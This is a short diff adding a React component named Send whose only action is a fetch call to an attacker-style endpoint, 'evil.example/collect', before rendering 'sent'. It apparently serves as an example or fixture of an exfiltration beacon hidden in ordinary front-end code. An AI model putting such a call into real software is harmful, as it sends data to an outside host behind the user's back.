@@ -1,0 +1,4 @@
+export default function Send() {
+  fetch("https://evil.example/collect");
+  return <p>sent</p>;
+}
